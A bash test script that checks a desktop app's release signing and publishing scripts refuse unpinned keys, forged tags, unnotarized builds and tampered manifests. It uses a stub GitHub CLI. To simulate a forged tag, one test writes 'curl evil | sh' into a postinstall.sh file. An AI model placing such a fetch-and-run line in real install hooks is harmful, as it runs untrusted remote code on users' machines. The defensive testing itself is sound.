#!/usr/bin/env bash
# Tests release-sign-manifest.sh and release-publish.sh with temp folders and a stub gh on PATH (nothing is uploaded, no account is
# asked anything). The signing key is a SOFTWARE P-256 key made here by release-key.swift --software (no test ever creates a Secure
# Enclave key); the committed "test" key must be refused.
# The signer and the publisher refuse any key the app does not pin (RELEASE_KEYS in packages/protocol/src/release-manifest.ts), and
# the real list now holds the owner's Secure Enclave key, which no test can sign with. So the happy paths run the two scripts from a
# THROWAWAY COPY of what they read (apps/desktop/scripts and packages/protocol, in this test's temp folder), whose RELEASE_KEYS is
# rewritten to pin this run's software key. Why a copy and not a flag or env var: anything the signer itself honoured could be set on
# a real release run too; a copy leaves the signer's code and the real pin untouched, and the scripts find the list from their own
# location (HERE/REPO_ROOT), so the copy is all they see. Why a copy of two folders and not a `git worktree add`: it is under 2 MB,
# needs no git state and leaves no worktree entry behind in the real repo if the run is killed. The copy is checked to really pin
# the test key before it is used, and the REAL scripts are run too, to prove they refuse that same key ("not one the app pins").
# Run by guards-test.sh. Usage: release-publish-test.sh
set -uo pipefail
HERE="$(cd "$(dirname "$0")/.." && pwd)"
ROOT="$(cd "$HERE/../.." && pwd -P)"
REAL_SIGN="$HERE/scripts/release-sign-manifest.sh"
REAL_PUBLISH="$HERE/scripts/release-publish.sh"
fail=0
ok() { echo "  ok   $1"; }
bad() { echo "  FAIL $1" >&2; fail=1; }
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT
unset TALOS_RELEASE_KEY
export TALOS_RELEASE_KEY_ALLOW_SOFTWARE=1  # SOFTWARE P-256 keys only: no test ever creates a Secure Enclave key
KEYTOOL="$HERE/scripts/release-key.swift"
swift "$KEYTOOL" create --out "$T/rel.key" --software > "$T/rel.pin" || { echo "  FAIL release-key.swift create --software" >&2; exit 1; }
REL_KID="$(sed -n 's/^kid //p' "$T/rel.pin")"
REL_PUB="$(sed -nE "s/.*publicKey: '([^']+)'.*/\1/p" "$T/rel.pin")"
# pinned_tree <dir> [kid pub]: the throwaway copy the signer and publisher run from, its RELEASE_KEYS rewritten to pin only the
# given key (none: the empty placeholder). Fails the whole test if the rewrite did not take, so a changed source file cannot quietly
# leave the real pin in place.
pinned_tree() {
  local d="$1" lit="[]"
  [ $# -lt 3 ] || lit="[{ kid: '$2', publicKey: '$3' }]"
  mkdir -p "$d/apps/desktop" "$d/packages/protocol"
  cp -R "$HERE/scripts" "$d/apps/desktop/scripts"
  cp -R "$ROOT/packages/protocol/src" "$ROOT/packages/protocol/package.json" "$d/packages/protocol/"
  ln -s "$ROOT/packages/protocol/node_modules" "$d/packages/protocol/node_modules"
  ln -s "$ROOT/scripts" "$d/scripts"  # release-publish.sh runs the personal-data check from here
  node -e '
const fs = require("fs"); const [f, lit] = process.argv.slice(1); const s = fs.readFileSync(f, "utf8")
const re = /export const RELEASE_KEYS: readonly ReleaseKey\[\] = \[[\s\S]*?\n\]\n/
if (!re.test(s)) { process.stderr.write("RELEASE_KEYS not found in the copy\n"); process.exit(1) }
fs.writeFileSync(f, s.replace(re, () => `export const RELEASE_KEYS: readonly ReleaseKey[] = ${lit}\n`))' "$d/packages/protocol/src/release-manifest.ts" "$lit" \
    || { echo "  FAIL could not pin the test key in the copy" >&2; exit 1; }
  local got
  got="$(node --disable-warning=ExperimentalWarning --input-type=module -e '
const p = await import(process.argv[1]); process.stdout.write(p.RELEASE_KEYS.map((k) => `${k.kid} ${k.publicKey}`).join(","))' \
    "$d/packages/protocol/src/release-manifest.ts")"
  [ "$got" = "${2:-}${3:+ $3}" ] || { echo "  FAIL the copy pins '$got', not the test key" >&2; exit 1; }
}
pinned_tree "$T/tree" "$REL_KID" "$REL_PUB"
SIGN="$T/tree/apps/desktop/scripts/release-sign-manifest.sh"
PUBLISH="$T/tree/apps/desktop/scripts/release-publish.sh"
# the committed test key, in the key file's own form: always refused as a release key
KEYS="$ROOT/packages/protocol/fixtures/release-manifest/test-key.json"
node -e '
const c = require("node:crypto"); const k = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")).test
const d = Buffer.from(c.createPrivateKey(k.private_pkcs8_pem).export({ format: "jwk" }).d, "base64url").toString("base64")
require("fs").writeFileSync(process.argv[2], JSON.stringify({ v: 1, type: "software", key: d }), { mode: 0o600 })' "$KEYS" "$T/test.key"

# The private commit the app is built from and the public snapshot commit made from it: different, as in the real repos (the public
# one is a squashed snapshot that shares no commits with the private one).
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.com GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.com
SRCREPO="$T/private"; PUBGIT="$T/public.git"; SNAP="$T/snap"
mkdir -p "$SRCREPO/scripts" "$SRCREPO/apps/web" "$SRCREPO/docs"
cp "$ROOT/scripts/export-public.sh" "$SRCREPO/scripts/"
printf '# Talos\n' > "$SRCREPO/README.md"; printf 'export const x = 1\n' > "$SRCREPO/apps/web/x.ts"; printf 'private spec\n' > "$SRCREPO/docs/SPEC.md"
git init -q -b main "$SRCREPO"; git -C "$SRCREPO" add -A; git -C "$SRCREPO" commit -qm source
SRC_SHA="$(git -C "$SRCREPO" rev-parse HEAD)"
# the public snapshot of it, as publish-public.sh makes one: the export, one commit, the trailer, the tag
git init -q --bare "$PUBGIT"; git init -q -b main "$SNAP"
EXPORT_SOURCE="$SRCREPO" bash "$SRCREPO/scripts/export-public.sh" "$T/export" >/dev/null || { echo "  FAIL could not export the test source" >&2; exit 1; }
cp -R "$T/export/." "$SNAP/"; git -C "$SNAP" add -A --force
git -C "$SNAP" commit -qm "Snapshot 11/14" -m "Talos-Source: $SRC_SHA"
PUB_SHA="$(git -C "$SNAP" rev-parse HEAD)"
git -C "$SNAP" tag v1.5.0; git -C "$SNAP" tag v1.4.0; git -C "$SNAP" push -q "$PUBGIT" main --tags
[ "$PUB_SHA" != "$SRC_SHA" ] || { echo "  FAIL the two repos share a sha" >&2; exit 1; }
SIGNARGS=(--public-url "$PUBGIT" --source-repo "$SRCREPO")
release_dir() {  # release_dir <dir> [notarized true|false]: what release-app.sh leaves
  rm -rf "$1"; mkdir -p "$1"
  printf 'zip bytes' > "$1/Talos-1.5.0-universal.zip"
  local s; s="$(shasum -a 256 "$1/Talos-1.5.0-universal.zip" | awk '{print $1}')"
  printf '%s  Talos-1.5.0-universal.zip\n' "$s" > "$1/Talos-1.5.0-universal.zip.sha256"
  cat > "$1/Talos-1.5.0-universal.manifest.json" <<J
{"app":"Talos.app","bundle_id":"app.talos.desktop","version":"1.5.0","build":"12","git_sha":"${3:-$SRC_SHA}","source_sha":"${3:-$SRC_SHA}","zip":"Talos-1.5.0-universal.zip",
 "sha256":"$s","arch":"universal","slices":["arm64","x86_64"],"team_id":"ABCDE12345","hardened_runtime":true,"notarized":${2:-true},"stapled":${2:-true},"built_at":"2026-11-14T20:00:00Z"}
J
}

echo "release-sign-manifest.sh"
R="$T/rel"; release_dir "$R"
OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
VERIFY="$(node --disable-warning=ExperimentalWarning --input-type=module -e '
const [proto, dir, kid, pub] = process.argv.slice(1)
const fs = await import("node:fs"); const p = await import(proto)
const bytes = fs.readFileSync(`${dir}/latest.json`); const r = p.verifyReleaseManifest(bytes, fs.readFileSync(`${dir}/latest.json.sig`, "utf8"), { keys: [{ kid, publicKey: pub }], retired: [] })
process.stdout.write(r.ok && p.releaseManifestJson(r.manifest) === bytes.toString("utf8") ? `${r.manifest.kid} ${r.manifest.version} ${r.manifest.git_sha} ${r.manifest.zip_url}` : `bad ${JSON.stringify(r)}`)
' "$ROOT/packages/protocol/src/release-manifest.ts" "$R" "$REL_KID" "$REL_PUB" 2>&1)"
if [ "$rc" = 0 ] && [ "$VERIFY" = "$REL_KID 1.5.0 $PUB_SHA https://github.com/treynortetik-creator/talos/releases/download/v1.5.0/Talos-1.5.0-universal.zip" ] \
  && case "$OUT" in *"WARNING"*) false ;; *) true ;; esac; then
  ok "signs (release-key.swift, P-256) a canonical latest.json naming its kid and the PUBLIC commit, verifying with the key's public half (pinned: no warning)"
else bad "sign: exit $rc, verify: $VERIFY, out: $OUT"; fi
# the REAL signer, from the real tree, refuses this same software key: it is not one the app pins
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$REAL_SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && [ ! -e "$R/latest.json.tmp" ] \
  && case "$OUT" in *"not one the app pins (RELEASE_KEYS): unknown_kid"*) true ;; *) false ;; esac \
  && ok "the real signer refuses a key the real tree does not pin, and writes nothing" || bad "real signer, unpinned key: exit $rc: $OUT"
# with the placeholder (no key pinned) it still signs, and says loudly that no app will install the release
pinned_tree "$T/unpinned"
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$T/unpinned/apps/desktop/scripts/release-sign-manifest.sh" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 0 ] && [ -e "$R/latest.json" ] && case "$OUT" in *"WARNING: the app pins no release key yet"*) true ;; *) false ;; esac \
  && ok "while the app pins no key it signs but warns" || bad "unpinned placeholder: exit $rc: $OUT"
KEYB64="$(node -e 'process.stdout.write(JSON.parse(require("fs").readFileSync(process.argv[1],"utf8")).key)' "$T/rel.key")"
if ! grep -qF "$KEYB64" "$R"/* && ! printf '%s' "$OUT" | grep -qF "$KEYB64"; then ok "the key is in no output and no file it wrote"
else bad "the key leaked into the output or the release folder"; fi

release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/test.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"TEST key"*) true ;; *) false ;; esac \
  && ok "the committed test key is refused" || bad "test key: exit $rc: $OUT"
release_dir "$R" false; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"not notarized and stapled"*) true ;; *) false ;; esac && ok "a build that is not notarized is refused" || bad "unnotarized: exit $rc: $OUT"
release_dir "$R"; printf 'other bytes' > "$R/Talos-1.5.0-universal.zip"
OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"its sha256 differs"*) true ;; *) false ;; esac && ok "a zip that is not the one release-app.sh made is refused" || bad "changed zip: exit $rc: $OUT"
release_dir "$R"; chmod 644 "$T/rel.key"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
chmod 600 "$T/rel.key"
[ "$rc" = 65 ] && ok "a key file others can read is refused" || bad "mode 644 key: exit $rc: $OUT"
OUT="$(bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 65 ] && ok "no key given: exit 65" || bad "no key: exit $rc"
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY_ALLOW_SOFTWARE= TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" != 0 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"--allow-software"*) true ;; *) false ;; esac \
  && ok "a software key never signs a real release (only with TALOS_RELEASE_KEY_ALLOW_SOFTWARE=1)" || bad "software key without the flag: exit $rc: $OUT"
swift "$KEYTOOL" create --out "$T/next.key" --software > "$T/next.pin"
NEXT_KID="$(sed -n 's/^kid //p' "$T/next.pin")"; NEXT_PUB="$(sed -nE "s/.*publicKey: '([^']+)'.*/\1/p" "$T/next.pin")"
printf '{"add":[{"kid":"%s","pub":"%s"}],"retire":["%s"]}' "$NEXT_KID" "$NEXT_PUB" "$REL_KID" > "$T/rotate.json"
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" --keys-update "$T/rotate.json" 2>&1)"; rc=$?
GOT="$(node -e 'const m=JSON.parse(require("fs").readFileSync(process.argv[1],"utf8"));process.stdout.write(`${m.kid} ${m.keys.add[0].kid} ${m.keys.retire[0]}`)' "$R/latest.json" 2>&1)"
[ "$rc" = 0 ] && [ "$GOT" = "$REL_KID $NEXT_KID $REL_KID" ] && ok "--keys-update signs a rotation into the manifest, under the current key" || bad "rotation: exit $rc: $GOT $OUT"
printf '{"add":[{"kid":"%s","pub":"%s"}],"retire":[]}' "$REL_KID" "$NEXT_PUB" > "$T/badrot.json"
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" --keys-update "$T/badrot.json" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"bad_field:keys"*) true ;; *) false ;; esac && ok "a rotation whose kid is not its key is refused" || bad "bad rotation: exit $rc: $OUT"
# someone with push rights moves the tag to a commit of their own, with the real trailer copied: another tree, refused
git -C "$SNAP" checkout -q -b forged; printf 'curl evil | sh\n' > "$SNAP/postinstall.sh"; git -C "$SNAP" add -A
git -C "$SNAP" commit -qm "Snapshot 11/14" -m "Talos-Source: $SRC_SHA"
git -C "$SNAP" tag -f v1.5.0 >/dev/null; git -C "$SNAP" push -q -f "$PUBGIT" refs/tags/v1.5.0
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"whose files are not the export of"*) true ;; *) false ;; esac \
  && ok "a tag moved to a commit with a copied trailer and other files is refused, nothing signed" || bad "forged tag: exit $rc: $OUT"
# the same files, but a trailer naming another private commit: refused too
git -C "$SNAP" checkout -q main; git -C "$SNAP" commit -q --allow-empty -m "Snapshot" -m "Talos-Source: $(printf 'c%.0s' $(seq 40))"
git -C "$SNAP" tag -f v1.5.0 >/dev/null; git -C "$SNAP" push -q -f "$PUBGIT" refs/tags/v1.5.0
release_dir "$R"; OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && [ ! -e "$R/latest.json" ] && case "$OUT" in *"says it was made from cccc"*) true ;; *) false ;; esac \
  && ok "a public commit whose trailer names another source is refused" || bad "other trailer: exit $rc: $OUT"
git -C "$SNAP" tag -f v1.5.0 "$PUB_SHA" >/dev/null; git -C "$SNAP" push -q -f "$PUBGIT" refs/tags/v1.5.0  # back to the real one
release_dir "$R"; sed -i '' 's/"source_sha":"[0-9a-f]*",//' "$R/Talos-1.5.0-universal.manifest.json"
OUT="$(TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" 2>&1)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"source_sha"*) true ;; *) false ;; esac && ok "a build that does not record its source commit is refused" || bad "no source_sha: exit $rc: $OUT"

echo "release-publish.sh"
release_dir "$R"; TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.5.0 "${SIGNARGS[@]}" --dir "$R" >/dev/null 2>&1
STUB="$T/stub"; mkdir -p "$STUB"
export GHLOG="$T/gh.log" GH_ROWS="$T/rows.tsv" GH_TAG_SHA="" GH_RELEASE_EXISTS=0 GH_LOGIN=treynortetik-creator GH_TRAILER="$SRC_SHA"
export SRC_SHA PUB_SHA
# A stub that answers like GitHub for two DIFFERENT repos: statuses exist only for the private commit (asked for anything else it
# returns none), the public commit's message carries the trailer, and only the public tag and public commit are known there.
cat > "$STUB/gh" <<'S'
#!/bin/bash
echo "gh $*" >> "$GHLOG"
case "$*" in
  "api user --jq .login") echo "$GH_LOGIN" ;;
  "api --paginate repos/owner/private/commits/$SRC_SHA/statuses"*) cat "$GH_ROWS" ;;
  "api --paginate repos/"*) : ;;
  "api repos/treynortetik-creator/talos/commits/v1.5.0 --jq .sha") [ -n "$GH_TAG_SHA" ] || exit 1; echo "$GH_TAG_SHA" ;;
  "api repos/treynortetik-creator/talos/commits/$PUB_SHA --jq .commit.message")
    printf 'Snapshot 11/14\n'; [ -z "$GH_TRAILER" ] || printf '\nTalos-Source: %s\n' "$GH_TRAILER" ;;
  "api repos/"*) exit 1 ;;
  "release view"*) [ "$GH_RELEASE_EXISTS" = 1 ] ;;
  "release create"*) exit 0 ;;
  *) exit 2 ;;
esac
S
chmod +x "$STUB/gh"
rows() {  # rows <state of check> [omit-job]: the six statuses, newest first, plus an older red one that must not count
  : > "$GH_ROWS"
  for j in check mod browser image desktop mobile; do
    [ "$j" = "${2:-}" ] && continue
    if [ "$j" = check ]; then printf 'local-ci/%s\t%s\tpassed on delphi\n' "$j" "$1" >> "$GH_ROWS"
    else printf 'local-ci/%s\tsuccess\tpassed on delphi\n' "$j" >> "$GH_ROWS"; fi
  done
  printf 'local-ci/desktop\tfailure\tfailed on delphi\n' >> "$GH_ROWS"
}
pub() { : > "$GHLOG"; PATH="$STUB:$PATH" bash "$PUBLISH" v1.5.0 --dir "$R" --ci-repo owner/private "$@" 2>&1; }
rows success; GH_TAG_SHA="$PUB_SHA"
OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 0 ] && [ "$OUT" = "release 1.5.0: dry run ok" ] && ! grep -q "release create" "$GHLOG" \
  && grep -q "commits/$SRC_SHA/statuses" "$GHLOG" && ! grep -q "commits/$PUB_SHA/statuses" "$GHLOG" \
  && ok "public tag at latest.json's commit, its trailer the build's source, six green on that private commit: dry run ok" || bad "dry run: exit $rc: $OUT"
OUT="$(pub)"; rc=$?
[ "$rc" = 0 ] && [ "$OUT" = "release 1.5.0: ok" ] && grep -q "release create v1.5.0 --repo treynortetik-creator/talos --verify-tag .*Talos-1.5.0-universal.zip .*Talos-1.5.0-universal.zip.sha256 .*latest.json .*latest.json.sig" "$GHLOG" \
  && ok "for real (stub gh): the four files go up on the public repo" || bad "publish: exit $rc: $OUT; $(cat "$GHLOG")"
OUT="$(: > "$GHLOG"; PATH="$STUB:$PATH" bash "$REAL_PUBLISH" v1.5.0 --dir "$R" --ci-repo owner/private --dry-run 2>&1)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"does not verify with the pinned release key (unknown_kid)"*) true ;; *) false ;; esac \
  && ok "the real publisher refuses a manifest signed by a key the real tree does not pin" || bad "real publisher, unpinned key: exit $rc: $OUT"
rows failure; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && [ "$OUT" = "FAILED: local-ci/check on ${SRC_SHA:0:7} is failure, not success" ] && ok "a red job is refused" || bad "red check: $OUT"
rows success mobile; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in "FAILED: ${SRC_SHA:0:7} has no local-ci/mobile status"*) true ;; *) false ;; esac && ok "five of six is refused" || bad "missing job: $OUT"
rows success; sed -i '' 's#^local-ci/check\tsuccess\tpassed on delphi#local-ci/check\tsuccess\tskipped: no check inputs changed since abcdef1#' "$GH_ROWS"
OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"was skipped, not passed"*) true ;; *) false ;; esac && ok "a skipped check job is not a pass" || bad "skipped check: $OUT"
rows success; GH_TAG_SHA="fedcba9876543210fedcba9876543210fedcba98"; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"never ahead of the public code"*) true ;; *) false ;; esac && ok "a public tag at another commit is refused" || bad "tag elsewhere: $OUT"
GH_TAG_SHA=""; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"is not on treynortetik-creator/talos"*) true ;; *) false ;; esac && ok "a tag not on the public repo is refused" || bad "no tag: $OUT"
GH_TAG_SHA="$PUB_SHA"; printf 'Fixes for %s\n' "/Us""ers/someone/talos" > "$T/summary.txt"
OUT="$(pub --dry-run --summary-file "$T/summary.txt")"; rc=$?
[ "$rc" = 1 ] && [ "$OUT" = "FAILED: the release notes did not pass the personal-data check" ] && ok "notes with a home path are refused" || bad "personal notes: $OUT"
printf 'Faster start and a steadier menu bar.\n' > "$T/summary.txt"
OUT="$(pub --dry-run --summary-file "$T/summary.txt")"; rc=$?
[ "$rc" = 0 ] && ok "plain notes pass" || bad "plain notes: $OUT"
GH_TRAILER=""; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"has no Talos-Source trailer"*) true ;; *) false ;; esac && ok "a public commit with no Talos-Source trailer is refused" || bad "no trailer: $OUT"
GH_TRAILER="fedcba9876543210fedcba9876543210fedcba98"; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"the app was built from ${SRC_SHA:0:7}, but the public snapshot was made from fedcba9"*) true ;; *) false ;; esac \
  && ok "a snapshot made from another private commit than the build's is refused" || bad "trailer elsewhere: $OUT"
GH_TRAILER="$SRC_SHA"; GH_LOGIN=someone-else; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"signed in as someone-else, not treynortetik-creator"*) true ;; *) false ;; esac && ! grep -q "commits/" "$GHLOG" \
  && ok "gh signed in as another account: refused before anything else" || bad "other login: $OUT"
GH_LOGIN=treynortetik-creator
GH_RELEASE_EXISTS=1; OUT="$(pub)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"already exists"*) true ;; *) false ;; esac && ! grep -q "release create" "$GHLOG" \
  && ok "an existing release is never changed" || bad "existing release: $OUT"
GH_RELEASE_EXISTS=0; printf 'x' >> "$R/latest.json"; OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in FAILED:*) true ;; *) false ;; esac && ok "a latest.json changed after signing no longer reads" || bad "changed latest.json: $OUT"
release_dir "$R"; TALOS_RELEASE_KEY="$T/rel.key" bash "$SIGN" --tag v1.4.0 "${SIGNARGS[@]}" --dir "$R" >/dev/null 2>&1
OUT="$(pub --dry-run)"; rc=$?
[ "$rc" = 1 ] && case "$OUT" in *"is for tag v1.4.0"*) true ;; *) false ;; esac && ok "a manifest signed for another tag is refused" || bad "tag mismatch: $OUT"

exit $fail
